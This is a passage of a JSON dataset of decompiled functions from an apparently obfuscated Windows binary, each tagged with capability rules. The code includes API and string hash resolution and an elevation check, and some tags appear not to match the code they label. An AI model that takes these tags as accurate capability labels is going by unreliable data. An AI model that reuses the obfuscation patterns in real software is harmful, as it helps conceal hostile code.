0xcfd5afa1);\n        *0x41e814 = fcn.0040acd8(0x4183d0, 4, 0xef1e12f7);\n    }\n    uVar2 = 1;\n    uVar3 = 0;\n    do {\n        uVar1 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(param_1, *(uVar3 + 0x41e7a0));\n        if (uVar1 != 0) {\n            uVar2 = 0;\n            break;\n        }\n        uVar3 = uVar3 + 4;\n    } while (uVar3 < 0x78);\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 1246
    },
    "0040a005": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a005(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040acd8(0x418abc, 5, 0xa1e9b028, arg_8h, arg_ch + 0x30);\n    iVar1 = fcn.0040beef(arg_8h_00, arg_8h);\n    if (iVar1 != 0) {\n        if ((*(arg_ch + 4) & 1) != 0) {\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(0, *(arg_ch + 4) & 0xfffffffe);\n        }\n        fcn.00409fbf(0, iVar1);\n    }\n    return 1;\n}\n",
        "token_count": 205
    },
    "0040c397": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040c397(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if ((*0x41e824 & 1) == 0) {\n        *0x41e824 = *0x41e824 | 1;\n        uVar1 = fcn.0040a88f(0x418bf4, 0xe, 0x76e71bff, 0);\n        uVar2 = fcn.0040a88f(str.JR_Pj5_, 8, 0x97b67347, 0);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2, uVar1);\n        *0x41e820 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    }\n    if (*0x41e820 != NULL) {\n        (**0x41e820)(arg_8h, &var_4h);\n    }\n    return var_4h != 0;\n}\n",
        "token_count": 248
    },
    "0040d830": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d830(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    uVar2 = arg_8h;\n    if ((arg_8h & 1) != 0) {\n        uVar1 = fcn.0040acd8(0x418de8, 0x1a, 0xb654b5bf);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    if ((arg_8h & 2) != 0) {\n        uVar1 = fcn.0040acd8(0x418e04, 0x1a, 0x24744e25);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    if ((arg_8h & 4) != 0) {\n        uVar1 = fcn.0040acd8(0x418e20, 10, 0xdb77878d);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    if ((arg_8h & 8) != 0) {\n        uVar1 = fcn.0040acd8(0x418e2c, 1, 0xfd45f8ab);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    if ((arg_8h & 0x10) != 0) {\n        uVar1 = fcn.0040acd8(0x418e30, 1, 0x31743013);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    if ((arg_8h & 0x20) != 0) {\n        uVar1 = fcn.0040acd8(0x418e34, 1, 0x5fe17c21);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    if ((arg_8h & 0x40) != 0) {\n        uVar1 = fcn.0040acd8(0x418e38, 0xb, 0x62682b44);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    if ((arg_8h & 0x80) != 0) {\n        uVar1 = fcn.0040acd8(0x418e44, 8, 0x9ea27f74);\n        uVar2 = fcn.0040c082(uVar1);\n    }\n    *arg_ch = uVar2;\n    return 0;\n}\n",
        "token_count": 602
    },
    "0040f93e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040f93e(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    if ('d' < param_1) {\n        if (param_1 < 'q') {\n            if (param_1 != 'p') {\n                if ('d' < param_1) {\n                    if (param_1 < 'h') {\ncode_r0x0040fa2b:\n                        *in_EAX = 10;\n                        goto code_r0x0040fa6f;\n                    }\n                    if (param_1 == 'i') goto code_r0x0040fa15;\n                    if (param_1 == 'o') {\n                        if ((in_EAX[1] & 0x13U) == 0) {\n                            in_EAX[1] = in_EAX[1] | 1;\n                        }\n                        *in_EAX = 8;\n                        goto code_r0x0040fa6f;\n                    }\n                }\n                goto code_r0x0040fa45;\n            }\ncode_r0x0040f975:\n            in_EAX[1] = in_EAX[1] | 0x20;\n            in_EAX[2] = 8;\n        }\n        else {\n            if (param_1 == 's') {\n                iVar1 = ((*(in_EAX + 1) & 5) != 0) + 3;\n                goto code_r0x0040fa6d;\n            }\n            if (param_1 == 'u') {\n                if ((in_EAX[1] & 0x13U) == 0) {\n                    in_EAX[1] = in_EAX[1] | 1;\n                }\n                *in_EAX = 6;\n                goto code_r0x0040fa6f;\n            }\n            if (param_1 != 'x') goto code_r0x0040fa45;\n        }\ncode_r0x0040f980:\n        if ((in_EAX[1] & 0x33U) == 0) {\n            in_EAX[1] = in_EAX[1] | 1;\n        }\n        *in_EAX = 7;\n        goto code_r0x0040fa6f;\n    }\n    if (param_1 == 'd') {\ncode_r0x0040fa15:\n        if ((in_EAX[1] & 0x13U) == 0) {\n            in_EAX[1] = in_EAX[1] | 1;\n        }\n        *in_EAX = 5;\n        goto code_r0x0040fa6f;\n    }\n    if (param_1 < 'T') {\n        if (param_1 == 'S') {\n            iVar1 = 4 - ((in_EAX[1] & 6U) != 0);\n        }\n        else {\n            if (param_1 != 'C') {\n                if ((param_1 == 'E') || (param_1 == 'G')) goto code_r0x0040fa2b;\n                if (param_1 == 'P') goto code_r0x0040f975;\n                goto code_r0x0040fa45;\n            }\n            bVar2 = (*(in_EAX + 1) & 2) == 0;\ncode_r0x0040f9a3:\n            iVar1 = bVar2 + 1;\n        }\ncode_r0x0040fa6d:\n        *in_EAX = iVar1;\n    }\n    else {\n        if (param_1 == 'X') goto code_r0x0040f980;\n        if (param_1 == '[') {\n            *in_EAX = 9;\n            goto code_r0x0040fa6f;\n        }\n        if (param_1 == 'c') {\n            bVar2 = (*(in_EAX + 1) & 1) != 0;\n            goto code_r0x0040f9a3;\n        }\ncode_r0x0040fa45:\n        *in_EAX = 0;\n    }\ncode_r0x0040fa6f:\n    return *in_EAX;\n}\n",
        "token_count": 921
    },
    "00413f33": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413f33(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t *arg_ch_00;\n    uint8_t *arg_14h;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint8_t *arg_8h_02;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00412833();\n    arg_14h = fcn.00412833();\n    arg_8h_00 = fcn.00412833();\n    arg_8h_01 = fcn.00412833();\n    fcn.004137e3(arg_ch);\n    fcn.004137e3(arg_10h);\n    iVar1 = fcn.0041374c(arg_ch_00);\n    if (iVar1 < 0) {\n        fcn.004137e3(arg_ch_00);\n        fcn.004137e3(arg_14h);\n        fcn.004137e3(arg_8h_01);\n    }\n    iVar1 = fcn.0041377d(arg_14h);\n    if (iVar1 == 0) {\n        fcn.00413c47(arg_8h_00, arg_ch_00, unaff_ESI, arg_14h);\n        fcn.004137e3(arg_14h);\n        fcn.004137e3(arg_8h_00);\n        iVar1 = fcn.0041377d(arg_14h);\n        if (iVar1 == 0) {\n            var_ch = 0;\n            while (((*arg_ch_00 & 1) == 0 && ((*arg_14h & 1) == 0))) {\n                fcn.004138f4(arg_ch_00, arg_ch_00, 1, unaff_ESI);\n                fcn.004138f4(arg_14h, arg_14h, 1, unaff_ESI);\n                var_ch = var_ch + 1;\n            }\n            while (iVar1 = fcn.0041377d(arg_ch_00),  iVar1 == 0) {\n                while ((*arg_ch_00 & 1) == 0) {\n                    fcn.004138f4(arg_ch_00, arg_ch_00, 1, unaff_ESI);\n                }\n                while ((*arg_14h & 1) == 0) {\n                    fcn.004138f4(arg_14h, arg_14h, 1, unaff_ESI);\n                }\n                iVar1 = fcn.0041374c(arg_14h);\n                arg_8h_02 = arg_14h;\n                if (0 < iVar1) {\n                    arg_8h_02 = arg_ch_00;\n                }\n                fcn.0041321b(arg_8h_02, unaff_ESI);\n                fcn.004138f4(arg_8h_01, arg_8h_01, 1, unaff_ESI);\n                fcn.0041374c(arg_ch_00);\n                fcn.004137e3(arg_8h_01);\n            }\n            fcn.0041382f(arg_8h, arg_14h, var_ch, unaff_ESI);\n            goto code_r0x004140c8;\n        }\n    }\n    fcn.004137e3(arg_ch_00);\ncode_r0x004140c8:\n    if (arg_ch_00 != NULL) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_14h != NULL) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_8h_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_8h_01 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    return 0;\n}\n",
        "token_count": 930
    },
    "00414124": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414124(uint arg_8h)\n\n{\n    uint8_t *arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_8h_01;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint unaff_ESI;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00412833();\n    iVar1 = fcn.00412833();\n    puVar2 = fcn.00412833();\n    arg_8h_01 = fcn.00412833();\n    iVar3 = fcn.00412833();\n    iVar4 = fcn.00412833();\n    iVar5 = fcn.00413b65();\n    if (iVar5 < 1) {\ncode_r0x004142c8:\n        var_1ch = 0;\n    }\n    else {\n        fcn.00413a11(arg_8h);\n        fcn.004137e3(iVar3);\n        fcn.004137fb();\n        while ((*arg_8h_00 & 1) == 0) {\n            fcn.004138f4(arg_8h_00, arg_8h_00, 1, unaff_ESI);\n            fcn.004139da(iVar1);\n        }\n        fcn.0041379d(arg_8h);\n        var_18h = 0;\n        var_1ch = 1;\n        do {\n            fcn.004137fb();\n            do {\n                uVar6 = fcn.00414368();\n                *puVar2 = uVar6;\n                iVar5 = fcn.0041374c(puVar2);\n            } while (-1 < iVar5);\n            fcn.004137fb();\n            fcn.00414515(arg_8h_01, arg_8h_00, arg_8h);\n            while (((iVar5 = fcn.0041377d(iVar4),  iVar5 == 0 || (iVar5 = fcn.00413b65(),  iVar5 != 0)) &&\n                   (iVar5 = fcn.0041374c(arg_8h_01),  iVar5 != 0))) {\n                iVar5 = fcn.0041377d(iVar4);\n                if ((iVar5 == 0) && (iVar5 = fcn.00413b65(),  iVar5 == 0)) goto code_r0x004142c8;\n                fcn.004139da(iVar4);\n                iVar5 = fcn.0041374c(iVar4);\n                if (iVar5 < 0) {\n                    fcn.00413cc2(arg_8h_01, arg_8h_01, arg_8h_01, arg_8h);\n                }\n                iVar5 = fcn.0041374c(iVar4);\n                if (-1 < iVar5) goto code_r0x004142c8;\n            }\n            var_18h = var_18h + 1;\n        } while (var_18h < 0x32);\n    }\n    if (arg_8h_00 != NULL) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (iVar1 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (puVar2 != NULL) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_8h_01 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (iVar3 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (iVar4 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    return var_1ch;\n}\n",
        "token_count": 937
    },
    "0040bc95": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.0040bc95(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint lpVersionInformation;\n    uint32_t s;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    uVar3 = 0;\n    lpVersionInformation = 0x114;\n    sub.ntdll.dll_memset(&s, 0, 0x110);\n    (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n    if (s < 6) {\n        uVar3 = fcn.0040bc3b();\n    }\n    else {\n        TokenHandle = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength)\n            ;\n            if (iVar2 != 0) {\n                uVar3 = TokenInformation;\n            }\n            fcn.0040c13c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 282
    },
    "0040d79a": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0040d79a(char param_1)\n\n{\n    char cVar1;\n    \n    cVar1 = -1;\n    if (param_1 - 0x30U < 10) {\n        return param_1 + -0x30;\n    }\n    if (param_1 + 0x9fU < 6) {\n        return param_1 + -0x57;\n    }\n    if (param_1 + 0xbfU < 6) {\n        cVar1 = param_1 + -0x37;\n    }\n    return cVar1;\n}\n",
        "token_count": 133
    },
    "00411d02": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00411d02(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_28h = fcn.0040acd8(0x418e88, 0x2d, 0xc8516eed);\n    var_24h = 0;\n    var_20h = fcn.0040acd8(0x418eb8, 0x31, 0xab6e165f);\n    var_1ch = 0;\n    var_18h = fcn.0040acd8(str.3_52, 0x3b, 0x6fe18690);\n    var_14h = fcn.0040acd8(0x418f28, 3, 0xcc314950);\n    var_10h = fcn.0040acd8(0x418f2c, 0x24, 0xdcd34d47);\n    var_ch = fcn.0040acd8(0x418f54, 7, 0x4fc0736a);\n    var_8h = fcn.0040acd8(0x418f5c, 0x15, 0xbc8962a4);\n    var_4h = fcn.0040acd8(0x418f74, 0xc, 0xc09b894b);\n    uVar2 = var_4h & 0xffffff00;\n    if (unaff_EDI < 5) {\n        uVar1 = (&var_24h)[unaff_EDI * 2];\n        uVar2 = var_4h & 0xffffff00 | 1;\n        *unaff_ESI = (&var_28h)[unaff_EDI * 2];\n        unaff_ESI[1] = uVar1;\n    }\n    return uVar2;\n}\n",
        "token_count": 499
    },
    "00415506": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t fcn.00415506(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    int32_t iStack4;\n    \n    iVar4 = 0;\n    iStack4 = 0;\n    cVar1 = fcn.0040f8eb(param_1);\n    iVar3 = iVar4;\n    if ((((cVar1 != '\\0') && (cVar1 = fcn.004152ab(),  cVar1 != '\\0')) && (*(in_EAX + 0x14) == 5)) &&\n       (iVar2 = fcn.004152d3(param_1),  iVar2 != 0)) {\n        iVar5 = *(in_EAX + 0x10);\n        while ((iVar3 = iVar4,  iVar5 != 0 &&\n               ((iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(*(iVar5 + 0x1c), iVar2),  iVar3 != 0 ||\n                (bVar6 = iStack4 != 0,  iVar3 = iVar5,  iStack4 = iStack4 + -1,  bVar6))))) {\n            iVar5 = *(iVar5 + 8);\n        }\n        fcn.0040af12();\n    }\n    return iVar3;\n}\n",
        "token_count": 320
    },
    "00407d6d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.00407d6d(uint arg_8h, uchar *lpString, int32_t *arg_10h)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *lpString2;\n    uint8_t *puVar6;\n    uint extraout_ECX;\n    uint32_t uVar7;\n    uint32_t arg_10h_00;\n    ulong uVar8;\n    uint uVar9;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_50h;\n    int32_t iStack79;\n    uchar uStack75;\n    uint var_44h;\n    uint uStack67;\n    uchar uStack63;\n    int32_t var_38h;\n    int32_t iStack55;\n    uchar uStack51;\n    int32_t var_2ch;\n    int32_t iStack43;\n    uchar uStack39;\n    int32_t var_20h;\n    int32_t iStack31;\n    uchar uStack27;\n    uint32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    uchar *var_8h;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    var_ch = iVar3;\n    var_10h = fcn.0040ae05(8);\n    var_8h = var_10h;\njoined_r0x00407d9d:\n    do {\n        while( true ) {\n            while( true ) {\n                while( true ) {\n                    while( true ) {\n                        while( true ) {\n                            while( true ) {\n                                while( true ) {\n                                    if (iVar3 == 0) {\n                                        if (arg_10h != NULL) {\n                                            *arg_10h = var_ch;\n                                        }\n                                        return var_10h;\n                                    }\n                                    uVar4 = fcn.0040a88f(0x418738, 10, 0x80b794fb, 0);\n                                    pcVar2 = _sym.imp.SHLWAPI.dll_StrCmpNIA;\n                                    iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpNIA)(lpString, uVar4, 10);\n                                    if (iVar5 != 0) break;\n                                    var_20h._0_1_ = 0;\n                                    uStack27 = 0;\n                                    unique0x10000a65 = iVar5;\n                                    iStack31 = iVar5;\n                                    uVar4 = fcn.0040a88f(0x418744, 2, 0x1a8f6890, 0);\n                                    iVar5 = fcn.0040c762();\n                                    fcn.0040beb2(&var_20h, uVar4, iVar5 != 0);\n                                    fcn.00407d1a(&var_10h, &var_8h, &var_20h, 10);\n                                    lpString = lpString + 10;\n                                    iVar3 = iVar3 + -10;\n                                }\n                                uVar4 = fcn.0040a88f(0x418748, 8, 0xacb75a4f, 0);\n                                iVar5 = (*pcVar2)(lpString, uVar4, 8);\n                                if (iVar5 != 0) break;\n                                var_38h._0_1_ = 0;\n                                uStack51 = 0;\n                                unique0x10000a55 = iVar5;\n                                iStack55 = iVar5;\n                                uVar4 = fcn.0040a88f(0x418744, 2, 0x1a8f6890, 0);\n                                iVar5 = fcn.0040c40d();\n                                fcn.0040beb2(&var_38h, uVar4, iVar5 != 0);\n                                fcn.00407d1a(&var_10h, &var_8h, &var_38h, 8);\n                                lpString = lpString + 8;\n                                iVar3 = iVar3 + -8;\n                            }\n                            uVar4 = fcn.0040a88f(0x418754, 9, 0x591ccd8f, 0);\n                            iVar5 = (*pcVar2)(lpString, uVar4, 9);\n                            if (iVar5 != 0) break;\n                            uVar9 = 9;\n                            uVar4 = fcn.004087a4(arg_8h);\n                            fcn.00407d1a(&var_10h, &var_8h, uVar4, uVar9);\n                            lpString = lpString + 9;\n                            iVar3 = iVar3 + -9;\n                        }\n                        uVar4 = fcn.0040a88f(0x418760, 0xc, 0x9a65ba95, 0);\n                        iVar5 = (*pcVar2)(lpString, uVar4, 0xc);\n                        if (iVar5 != 0) break;\n                        var_50h._0_1_ = 0;\n                        uStack75 = 0;\n                        unique0x10000a4d = iVar5;\n                        iStack79 = iVar5;\n                        uVar4 = fcn.0040a88f(0x418770, 4, 0x6591fe1d, 0);\n                        uVar9 = fcn.004084db();\n                        fcn.0040beb2(&var_50h, uVar4, uVar9);\n                        fcn.00407d1a(&var_10h, &var_8h, &var_50h, 0xc);\n                        lpString = lpString + 0xc;\n                        iVar3 = iVar3 + -0xc;\n                    }\n                    uVar4 = fcn.0040a88f(0x418778, 4, 0x22569286, 0);\n                    iVar5 = (*pcVar2)(lpString, uVar4, 4);\n                    if (iVar5 != 0) break;\n                    var_2ch._0_1_ = 0;\n                    uStack39 = 0;\n                    unique0x10000a5d = iVar5;\n                    iStack43 = iVar5;\n                    uVar4 = fcn.0040a88f(0x418780, 2, 0x19c071df, 0);\n                    uVar9 = fcn.00407be8();\n                    fcn.0040beb2(&var_2ch, uVar4, uVar9);\n                    fcn.00407d1a(&var_10h, &var_8h, &var_2ch, 4);\n                    lpString = lpString + 4;\n                    iVar3 = iVar3 + -4;\n                }\n                uVar4 = fcn.0040a88f(0x418784, 7, 0xb2311a73, 0);\n                iVar5 = (*pcVar2)(lpString, uVar4, 7);\n                if (iVar5 != 0) break;\n                uVar9 = 7;\n                uVar4 = fcn.00406a3e(extraout_ECX);\n                fcn.00407d1a(&var_10h, &var_8h, uVar4, uVar9);\n                lpString = lpString + 7;\n                iVar3 = iVar3 + -7;\n            }\n            uVar4 = fcn.0040a88f(0x41878c, 0xd, 0xa537dcf1, 0);\n            iVar5 = (*pcVar2)(lpString, uVar4, 0xd);\n            if (iVar5 != 0) break;\n            uVar4 = 0xd;\n            lpString2 = fcn.004089f2();\ncode_r0x004081fd:\n            fcn.00407d1a(&var_10h, &var_8h, lpString2, uVar4);\n            lpString = lpString + 0xd;\n            iVar3 = iVar3 + -0xd;\n        }\n        uVar4 = fcn.0040a88f(0x41879c, 9, 0x7b1c9554, 0);\n        iVar5 = (*pcVar2)(lpString, uVar4, 9);\n        if (iVar5 == 0) {\n            puVar6 = fcn.00403dc7();\n            uVar4 = fcn.0040a88f(0x4187a8, 0x18, 0x234de26c, 0);\n            fcn.0040beb2(&var_bch, uVar4, *puVar6);\n            fcn.00407d1a(&var_10h, &var_8h, &var_bch, 9);\n            iVar3 = iVar3 + -9;\n            lpString = lpString + 9;\n            goto joined_r0x00407d9d;\n        }\n        uVar4 = fcn.0040a88f(0x4187c4, 0xd, 0xe76f7844, 0);\n        iVar5 = (*pcVar2)(lpString, uVar4, 0xd);\n        if (iVar5 == 0) {\n            var_b8h = 1;\n            var_b4h = 1;\n            var_b0h = 500;\n            var_ach = 500;\n            var_58h = 0xffffffff;\n            var_a8h = 1000;\n            var_a4h = 1000;\n            var_a0h = 2000;\n            var_9ch = 2000;\n            var_98h = 5000;\n            var_94h = 5000;\n            var_90h = 10000;\n            var_8ch = 10000;\n            var_88h = 20000;\n            var_84h = 20000;\n            var_80h = 50000;\n            var_7ch = 50000;\n            var_78h = 100000;\n            var_74h = 100000;\n            var_70h = 200000;\n            var_6ch = 200000;\n            var_68h = 500000;\n            var_64h = 500000;\n            var_bch = 0;\n            var_60h = 1000000;\n            var_5ch = 1000000;\n            uVar8 = fcn.00409aaf();\n            uVar7 = 0;\n            do {\n                if (((&var_bch)[uVar7 * 2] <= uVar8) && (arg_10h_00 = uVar7,  uVar8 < (&var_b8h)[uVar7 * 2])) break;\n                uVar7 = uVar7 + 1;\n                arg_10h_00 = uVar8 >> 0x20;\n            } while (uVar7 < 0xd);\n            var_44h._0_1_ = 0;\n            stack0xffffffb9 = 0;\n            uStack67 = 0;\n            uStack63 = 0;\n            uVar4 = fcn.0040a88f(0x418780, 2, 0x19c071df, 0);\n            fcn.0040beb2(&var_44h, uVar4, arg_10h_00);\n            uVar4 = 0xd;\n            lpString2 = &var_44h;\n            goto code_r0x004081fd;\n        }\n        uVar4 = fcn.0040a88f(0x4187d4, 6, 0xde4bebab, 0);\n        iVar5 = (*pcVar2)(lpString, uVar4, 6);\n        if (iVar5 == 0) {\n            var_14h = (*_sym.imp.SHLWAPI.dll_StrToIntA)(lpString + 6);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_StrChrA)(lpString, 0x7d);\n            iVar5 = iVar5 + (1 - lpString);\n            if (*0x41de1c < var_14h) {\n                var_14h = 1;\n            }\n            fcn.00407d1a(&var_10h, &var_8h, *(*0x41dc0c + -4 + var_14h * 4), iVar5);\n            lpString = lpString + iVar5;\n            iVar3 = iVar3 - iVar5;\n        }\n        else {\n            uVar4 = fcn.0040a88f(0x4187dc, 5, 0x1f47936f, 0);\n            iVar5 = (*pcVar2)(lpString, uVar4, 5);\n            if (iVar5 == 0) {\n                fcn.00407d1a(&var_10h, &var_8h, *0x41de18, 5);\n                lpString = lpString + 5;\n                iVar3 = iVar3 + -5;\n            }\n            else {\n                uVar1 = *lpString;\n                lpString = lpString + 1;\n                iVar3 = iVar3 + -1;\n                *var_8h = uVar1;\n                var_8h = var_8h + 1;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 3153
    },
    "0041374c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041374c(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    \n    if (param_1 != 0) {\n        puVar3 = param_2 + param_1 * 4;\n        do {\n            puVar3 = puVar3 + -1;\n            uVar1 = *((param_3 - param_2) + puVar3);\n            uVar2 = *puVar3;\n            param_1 = param_1 + -1;\n            if (uVar1 >= uVar2 && uVar1 != uVar2) {\n                return 1;\n            }\n            if (uVar1 < uVar2) {\n                return 0xffffffff;\n            }\n        } while (param_1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 208
    },
    "0041382f": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041382f(int32_t arg_8h, uint32_t *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_10h;\n    if (arg_10h < 0x20) {\n        arg_10h = 0;\n        uVar1 = uVar3;\n        uVar3 = arg_10h;\n        if (arg_14h != 0) {\n            arg_8h = arg_8h - arg_ch;\n            var_4h = arg_14h;\n            do {\n                uVar3 = (*arg_ch & ~(0xffffffffU >> (uVar1 & 0x1f))) >> (0x20 - uVar1 & 0x1f);\n                *(arg_8h + arg_ch) = *arg_ch << (uVar1 & 0x1f) | arg_10h;\n                arg_ch = arg_ch + 1;\n                var_4h = var_4h - 1;\n                arg_10h = uVar3;\n            } while (var_4h != 0);\n        }\n    }\n    else {\n        uVar3 = arg_10h >> 5;\n        if (arg_14h != 0) {\n            puVar4 = arg_ch + (arg_14h - uVar3);\n            uVar2 = arg_14h;\n            do {\n                uVar2 = uVar2 - 1;\n                puVar4 = puVar4 + -1;\n                if (uVar2 < uVar3) {\n                    *(arg_8h + uVar2 * 4) = 0;\n                }\n                else {\n                    *(arg_8h + uVar2 * 4) = *puVar4;\n                }\n            } while (uVar2 != 0);\n        }\n        arg_10h = arg_10h & 0x1f;\n        uVar3 = arg_ch[arg_14h - uVar3] << arg_10h;\n        if (arg_10h != 0) {\n            uVar2 = fcn.0041382f(arg_8h, arg_8h, arg_10h, arg_14h);\n            uVar3 = uVar3 | uVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 575
    },
    "00413aab": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
